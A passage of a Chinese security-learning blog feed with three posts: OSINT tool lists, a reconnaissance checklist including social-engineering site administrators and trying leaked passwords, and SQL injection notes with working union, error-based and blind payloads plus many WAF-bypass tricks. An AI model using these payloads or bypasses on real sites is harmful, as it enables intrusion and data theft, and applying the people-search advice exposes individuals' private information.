class=\"exturl\" data-url=\"aHR0cHM6Ly9wcml2YWN5LmNvbS8=\">Fake</span>    4. 可以使用VPN伪造IP Address</li>\n</ol>\n</li>\n</ol>\n</blockquote>\n<ol start=\"3\">\n<li>Search Engine OSINT   <ul>\n<li><p>常用搜索引擎：</p>\n<ol>\n<li><p>谷歌:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8=\">https://www.google.com</span> </p>\n</li>\n<li><p>DuckDuckGo:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kdWNrZHVja2dvLmNvbS8=\">https://duckduckgo.com/</span></p>\n</li>\n<li><p>Yandex:<span class=\"exturl\" data-url=\"aHR0cHM6Ly95YW5kZXguY29tLw==\">https://yandex.com/</span></p>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<ul>\n<li>谷歌Hack语法:</li>\n</ul>\n</blockquote>\n<pre><code>         1. &quot;A and B&quot;:包含A和B的网页\n         2. &quot;site:xxx.com&quot;:xxx.com网页下的文件\n         3. &quot;*&quot; :万能替换\n         4. &quot;filetype:pdf&quot;:搜索文件类型为PDF的结果\n         5. &quot;-resultA&quot;:不显示resultA的搜索结果\n         6. &quot;intext: resultB&quot;:显示在网页中有ResultB的结果\n         7. &quot;inurl:resultC&quot;:显示在网页URL中有ResultC的结果\n         8. 高级搜索:https://www.google.com/advanced_search\n</code></pre>\n<blockquote>\n<ol start=\"4\">\n<li>Reverse Picture OSINT<pre><code> 1. [Google图片搜索](https://images.google.com/)\n 2. [Yandex图片搜索](https://yandex.com/images/search)\n 3. [Tineye图片搜索](https://tineye.com/search)\n            Yadex在反向图片搜素这个方面更优秀一点，可以触类旁通反馈相似的图片\n</code></pre>\n</li>\n</ol>\n</blockquote>\n<blockquote>\n<p>​                   Tineye搜索的结果可能和Google有所不同，可能搜索到比较隐蔽的结果</p>\n</blockquote>\n<ol start=\"5\">\n<li><p>EXIF Data OSINT</p>\n<pre><code>     可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。\n      通过EXIF Data，我们可以获得图片的拍摄日期、拍摄器材、甚至拍摄地点\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9leGlmZGF0YS5jb20v\">在线EXIF信息提取网站</span></p>\n</li>\n</ol>\n<blockquote>\n<ol start=\"6\">\n<li>Real Address OSINT<pre><code> 1. [Google卫星地图](https://www.google.com/maps)\n 2. [百度地图查询](https://map.baidu.com/)\n 3. [地址猜测网站](https://www.geoguessr.com/)\n 4. [高德地图](https://www.amap.com/)\n  * 研究一个图片反应的所在地，要注重图片细节，比如图片中的人物、汽车牌照、气象细节、建筑物、常用规则。\n</code></pre>\n</li>\n<li>Email Address OSINT<pre><code> 1. [公司邮件查个人](https://hunter.io/)\n 2. [万能查询](https://phonebook.cz/)[付费,一年5000欧]\n 3. [精准个人查询](https://www.voilanorbert.com/)\n 4. [邮箱存活性验证](https://tools.emailhippo.com/)\n* 邮箱存活性验证技巧：尝试登录Google,如果到了输入密码那一步，说明邮箱是存在的。\n</code></pre>\n</li>\n<li>Password OSINT<pre><code> 1. [付费数据](https://dehashed.com/)[一天5￥，但是数据很神]\n 2. [信息泄露查询](https://leakcheck.io/)\n 3. [信息泄露自查](https://haveibeenpwned.com/)\n</code></pre>\n</li>\n<li>Hunting Username And Accouts<pre><code> 1. [用户注册检测](https://namechk.com/)\n 2. [注册用户检测](https://whatsmyname.app/)\n</code></pre>\n</li>\n<li>Searching For People<pre><code>1. [姓名电话住址查人](https://www.whitepages.com/)【美国用户信息】\n2. [手机号查人](https://www.truecaller.com/)\n</code></pre>\n</li>\n</ol>\n</blockquote>\n<p>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​<br>​        </p>\n",
            "tags": [
                "网安",
                "信息搜集"
            ]
        },
        {
            "id": "http://example.com/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
            "url": "http://example.com/2023/04/10/Internet%20Security/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
            "title": "信息搜集",
            "date_published": "2023-04-10T11:08:20.000Z",
            "content_html": "<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"cdn获取真实ip\"><a href=\"#cdn获取真实ip\" class=\"headerlink\" title=\"cdn获取真实ip\"></a>cdn获取真实ip</h3><ul>\n<li>方法一：<br>从全球各地去ping他的服务器（万一在一些穷乡僻壤的地方ping到了呢）</li>\n<li>方法二：<br>使用邮件订阅或RSS订阅的一种形式（大部分cdn不会防御件订阅或RSS订阅的东西）</li>\n<li>方法三：<br>ping二级域名（有些网站的二级域名可能不会做cdn）</li>\n<li>方法四：<br>用nslookup</li>\n<li>方法五：<br>查找一下域名的历史解析记录，毕竟域名再用cdn之前可能是用真实的ip</li>\n<li>F6：<br>phpinfo上可能显示他的真实ip</li>\n</ul>\n<h3 id=\"域名–渗透\"><a href=\"#域名–渗透\" class=\"headerlink\" title=\"域名–渗透\"></a>域名–渗透</h3><blockquote>\n<p>1.确定站点是否是主站</p>\n<blockquote>\n<p>如果是，先进行子域名的挖掘，然后从子域名入手，确定一下使用了什么服务器（中间件），查看一下他的CMS，用什么编程语言，大概使用了什么数据库，有没有使用cdn，如果有cdn，则需要搜集一下网站的真实ip，然后看一下网站的源代码是不是存在着信息泄露，有时还可以进一步对网站进行信息搜集，比如：whois查询，ip访查，使用google进行查询（黑客引擎进行敏感信息的搜集），查看目标的功能模块有没有文件上传，sql注入，xss等等漏洞。</p>\n</blockquote>\n</blockquote>\n<h3 id=\"扫描问题\"><a href=\"#扫描问题\" class=\"headerlink\" title=\"扫描问题\"></a>扫描问题</h3><ul>\n<li>Mysql 只扫到了80端口</li>\n</ul>\n<blockquote>\n<ol>\n<li>可能将Mysql端口改了</li>\n<li>也可能是站库分离</li>\n</ol>\n</blockquote>\n<ul>\n<li>Mysql数据库与网站分离，渗透进去后你可能发现他的配置文件里可能有去远程连接其他专门的数据库服务器的配置文件<blockquote>\n<ol start=\"3\">\n<li>3306端口不对外开放（用防火墙将自己的3306端口从内部deny掉了）</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"搜集目标网站注册人的信息\"><a href=\"#搜集目标网站注册人的信息\" class=\"headerlink\" title=\"搜集目标网站注册人的信息\"></a>搜集目标网站注册人的信息</h3><ol>\n<li>考虑用telegram上的一些社工库，看一下有没有他泄露的一些密码，尝试使用其泄露的密码去登录网站的后台。</li>\n<li>搜索引擎搜索邮箱关键词，看看他有没有在网上发布一些言论。</li>\n<li>利用搜索到的一些关联信息去找出其他的关联信息（邮箱，账号等等）与其聊天，套取一些信息。</li>\n<li>用社会工程学的方法去找到他的一些社交帐号（可能会在里面找到管理员设置密码的一些习惯）。</li>\n<li>利用已经拥有的信息生成一个专用的字典。</li>\n<li>观察管理员会逛哪些比较大众性的网站，通过这些网站可能会看到他密码提示的一些内容。</li>\n</ol>\n<h3 id=\"windows-or-linux\"><a href=\"#windows-or-linux\" class=\"headerlink\" title=\"windows or linux\"></a>windows or linux</h3><p> 区分–&gt; windows大小写不敏感，Linux大小写敏感</p>\n<h3 id=\"有一个网站\"><a href=\"#有一个网站\" class=\"headerlink\" title=\"有一个网站\"></a>有一个网站</h3><h4 id=\"如果知道（-xxx-xxxeditor-php-或（-xxx-admin-xxxx-php\"><a href=\"#如果知道（-xxx-xxxeditor-php-或（-xxx-admin-xxxx-php\" class=\"headerlink\" title=\"如果知道（./xxx/xxxeditor.php)或（./xxx/admin/xxxx.php)\"></a>如果知道（./xxx/xxxeditor.php)或（./xxx/admin/xxxx.php)</h4><blockquote>\n<ol>\n<li>直接在网站的二级文件xxx底下扫描敏感文件/目录。</li>\n</ol>\n</blockquote>\n<h4 id=\"如果在网站的表面\"><a href=\"#如果在网站的表面\" class=\"headerlink\" title=\"如果在网站的表面\"></a>如果在网站的表面</h4><blockquote>\n<ol>\n<li>在表面进行元素审查时，可以知道这个网站所利用的防护软件<ul>\n<li>在敏感操作中被拦截/通过界面无法判断使用了什么防护软件时，可以用f12去看一下html<pre><code>  * 如：&lt;护卫神&gt; ---会出现&lt;hws&gt;xxxx&lt;/hws&gt;\n</code></pre>\n</li>\n</ul>\n</li>\n<li>有时可以用img标签，当图片加载不出来会触发onerror属性,来获取管理员的一个后台路径</li>\n<li>还可以尝试在src里指定一个远程的脚本文件，获取referer</li>\n</ol>\n</blockquote>\n<h4 id=\"有时网站后台会做限制\"><a href=\"#有时网站后台会做限制\" class=\"headerlink\" title=\"有时网站后台会做限制\"></a>有时网站后台会做限制</h4><blockquote>\n<ol>\n<li>有时src属性的结尾必须要是.jpg .png .gif,<ul>\n<li>可以考虑用.htaccess在远程服务器上修改apache的配置文件</li>\n<li>或将.jpg文件当作php执行<pre><code>     * AppType application/x-http-php .jpg(打进去后一定要删掉）\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<h4 id=\"当在表面上没有看到一些漏洞\"><a href=\"#当在表面上没有看到一些漏洞\" class=\"headerlink\" title=\"当在表面上没有看到一些漏洞\"></a>当在表面上没有看到一些漏洞</h4><blockquote>\n<p>1 可以去查找旁站<br>           * 旁站—-&gt; 同一服务器上可能开了多台虚拟机，打下一台后可以借此把其他的也给打下来</p>\n</blockquote>\n<ul>\n<li>百度域名的查找</li>\n<li>百度ip访查域名（通过这个ip查找挂在其下的有哪些域名）</li>\n</ul>\n<h3 id=\"信息搜集流程\"><a href=\"#信息搜集流程\" class=\"headerlink\" title=\"信息搜集流程\"></a>信息搜集流程</h3><blockquote>\n<ol>\n<li>服务器的相关信息<ul>\n<li>真实ip</li>\n<li>系统类型及版本</li>\n<li>开放端口</li>\n<li>使用什么waf</li>\n</ul>\n</li>\n<li>网站的指纹<ul>\n<li>CMS</li>\n<li>cdn</li>\n<li>证书</li>\n<li>dns记录</li>\n</ul>\n</li>\n<li>whois的信息（社工库中寻找）<ul>\n<li>姓名</li>\n<li>备案</li>\n<li>邮箱</li>\n<li>电话访查</li>\n</ul>\n</li>\n<li>子域名 旁站  c段（ip的网段）</li>\n<li>google进行针对化的搜索<ul>\n<li>查pdf文件</li>\n<li>中间件版本</li>\n<li>弱口令</li>\n</ul>\n</li>\n<li>扫描网站目录<br> 爆破后台<br> 测试文件<br> 敏感文件</li>\n<li>传输协议<ul>\n<li>exp</li>\n<li>寻找相应源码</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"漏洞挖掘\"><a href=\"#漏洞挖掘\" class=\"headerlink\" title=\"漏洞挖掘\"></a>漏洞挖掘</h3><blockquote>\n<ol>\n<li>浏览网站<ul>\n<li>看一下网站的规模，功能，特点</li>\n<li>查看端口，目录，弱口令（进行一个扫描）<ul>\n<li>有端口响应，要对其进行探测<ul>\n<li>如：rsync，心脏出血漏洞，mysql漏洞，ftp,ssh,弱口令</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>xss   sql注入  文件上传  命令注入     csrf    cookie安全检查     敏感信息     通信数据传输     暴力破解     越权访问     未授权访问     目录遍历     文件包含     重放攻击     服务器漏洞检测     漏洞扫描</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n",
            "tags": [
                "网安",
                "信息搜集"
            ]
        },
        {
            "id": "http://example.com/2023/04/09/Internet%20Security/hello-world/",
            "url": "http://example.com/2023/04/09/Internet%20Security/hello-world/",
            "title": "SQL注入",
            "date_published": "2023-04-09T03:33:00.000Z",
            "content_html": "<h1 id=\"本周重点\"><a href=\"#本周重点\" class=\"headerlink\" title=\"本周重点\"></a>本周重点</h1><h3 id=\"1-产生原理（实质）\"><a href=\"#1-产生原理（实质）\" class=\"headerlink\" title=\"1.产生原理（实质）\"></a>1.产生原理（实质）</h3><p>1.用户能调控参数（像id=2 union select 1,2,3–+)要能添加代码<br>2.原本数据库只执行（id=2)语句，但执行了用户拼接的一些代码</p>\n<h3 id=\"2-类型\"><a href=\"#2-类型\" class=\"headerlink\" title=\"2.类型\"></a>2.类型</h3><p>1.联合注入<br>        2.堆叠注入<br>        3.宽字节注入<br>        4.cookie注入<br>        5.XFF头注入<br>        6.UA注入（user-agent注入）<br>        7.Referer注入<br>        8.二次注入<br>        9.base64注入<br>        11.万能密码<br>        12.文件读写<br>盲注类型：<br>        1.基于时间的盲注     sleep()   benchmark()<br>        2.基于布尔的注入<br>        3.基于报错的注入     updatexml()  extractvalue()  floor()  exp()</p>\n<h3 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h3><pre><code class=\"SQL\">一，union select\n?id=-2 &#39;   &quot;   )     &#39;)    &quot;)      ]     )]\norder by 3 --+\nunion select 1,2,3 --+\nunion select 1,database(),3 --+\nunion select 1,select group_concat(table_name) from information_schema.tables where table_schema=database(),3 --+\nunion select 1,select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name =&quot;&quot;,3--+\nunion select 1,select group_concat(id)from users,3 --+\n二，报错注入\n1.and extractvalue(1,concat(0x7e,(database()),0x7e)) --+\n2.and updatexml(1,(concat(0x3a,(database()),0x3a)),1) --+\n0x7e----&gt;~\n0x3a----&gt;:\n三,爆出\nindex.php?id=2&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+\n</code></pre>\n<h3 id=\"3-如何防范\"><a href=\"#3-如何防范\" class=\"headerlink\" title=\"3.如何防范\"></a>3.如何防范</h3><h4 id=\"存在哪些风险、对应的对策是什么。\"><a href=\"#存在哪些风险、对应的对策是什么。\" class=\"headerlink\" title=\"存在哪些风险、对应的对策是什么。\"></a>存在哪些风险、对应的对策是什么。</h4><blockquote>\n<p>1.预编译  （数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）</p>\n<blockquote>\n<p>2.PDO预处理                 (本地和Mysql服务端使用字符集对输入进行转义)</p>\n<blockquote>\n<p>3.正则表达式过滤          (如果用户输入了非法信息则利用正则表达式过滤)<br> 4那如何反防范呢？<br>接下来将展示一些绕过的姿势。<br>1.屏蔽or and 空格 注释符<br>or 用|| 或  |<br>and 用&amp;&amp; 或&amp;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<h3 id=\"4那如何反防范呢？\"><a href=\"#4那如何反防范呢？\" class=\"headerlink\" title=\"4那如何反防范呢？\"></a>4那如何反防范呢？</h3><h4 id=\"接下来将展示一些绕过的姿势。\"><a href=\"#接下来将展示一些绕过的姿势。\" class=\"headerlink\" title=\"接下来将展示一些绕过的姿势。\"></a>接下来将展示一些绕过的姿势。</h4><blockquote>\n<p>替代空格的东西<br>%09 水平tab键<br>%0a 新建一行<br>%0c 新建一页<br>%0d 回车键<br>%0b 垂直tab键<br>%a0 也是空格键</p>\n</blockquote>\n<blockquote>\n<p>屏蔽–+号<br>用 or ‘1’ =’1 代替<br>如<br>?id=2000000’%0aunion%0aselect%0a1,2,3%0a||%0a’1’=’1<br>如果哪天%的空格都不能用，不用空格<br>无空格写法用（）<br>?id=1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||’1’=’1</p>\n</blockquote>\n<hr>\n<pre><code class=\"SQL\">小知识:\n对&#39; \\ 屏蔽，前面多加个\\\n数据库用的是gbk编码，会把2个字符当作一个汉字\n如：\n?id=1%df\\&#39;（在机器看来这就是个1+字符+&#39;)\npost类\nburp抓包\n在目标位置admin%df%27 union select 1,2 #\n\n常见绕过：\n1.大小写绕过\nUnion SelEct\n2.双写绕过\nununionion\n3.编码绕过\nsecurity--&gt;hex编码\nurlencode\n4.注释符/**/\nuni/**/on sel/**/ect\n5.对于空格绕过\n开头已提过了\n6.对于or and绕过\nand = &amp;&amp;\nor = ||\n7.单引号\n%df%27\n8.反引号\n反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！\nselect username,password from `table1` where id=&#39;1&#39; limit 0,1\nwhere\nselect * from `where` where id =1\n9.内联注释\nand /*!select*/ 1,2\n10.&lt;&gt;绕过\nuni&lt;&gt;on sel&lt;&gt;ect\n对了这里加一布尔型的盲注(猜库名\nselect * from users where id=1 and ascii(substr(database(),0,1)) &gt; 115\ngreatest least\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\n\n11.屏蔽逗号\nselect substr(&quot;xxxxx&quot;,1,3)\nselect substr(&quot;xxxxx&quot; from 1 to 3)\n\nunion select 1,2,3\nunion select * from (select 1)a join (select 2)b join (select 3)c;\n\nlimit 0,1\nlimit 0 offset 1\n12.sleep屏蔽\nand sleep(1)\nand benchmark(100000000（0的个数视情况而定）,1);\n13.group_concat屏蔽\nselect group_concat(&quot;haha&quot;,&quot;niao&quot;);\nselect concat_ws(&quot; &quot;,&quot;haha&quot;,&quot;niao&quot;);\n（把&quot;&quot;放到&quot;haha&quot;,&quot;niao&quot;中间并合并输出）\n14.等号屏蔽\n用 like rlike regexp &lt;&gt;(不等号)?id=1&#39; or 1 like 1\n?id=1&#39; or 1 &lt;&gt; 1\n15.post情况屏蔽#\nid=3&quot;) or 1=1 -- a 使用--空格a可以在post情况下替代#\n16.ip地址拦截（只允许内网访问）\nX-forwarded-for：ip地址\nX-remote-IP：ip地址\nX-Originating-IP：ip地址\nX-remote-addr：ip地址\nX-Real-Ip：ip地址\n(一般放在抓包中间，DNT之后)\n17.修改静态资源\nhttp://www.xx.com/sql.php?id=1\n可以替换为\nhttp://www.xx.com/sql.php/1.js?id=1\n18.url白名单\n为了防止防火墙误伤，部分waf(防火墙)内置白名单列表 admin manager system...\n如:\nhttp://www.xx.com/sql.php/admin.php?id=1\nhttp://www.xx.com/sql.php?xxxx=/manager/&amp;b=攻击代码\n\nhttp://www.xx.com/../../../../manager/../sql.php?id=1\n19.爬虫白名单(waf让baidu等搜索引擎蜘蛛能进入)\n伪造自己是搜索引擎（修改user-agent）\n将user-agent改为baidu等一些搜索引擎蜘蛛的user-agent\n20.数据库注释执行\n/*!50001 select * from table1*/;\n如果数据库版本是5.00.01 版本以下的，语句才会执行\n/*!45509 union select */ 1,2,3 --+\n21.增加干扰\nunion all %23%a0 select 1,2,3 --+\n</code></pre>\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>有什么想法或心得体会，都可以拿出来分享下。</p>\n",
            "tags": [
                "网安",
                "Top10"
            ]
        }
    ]
}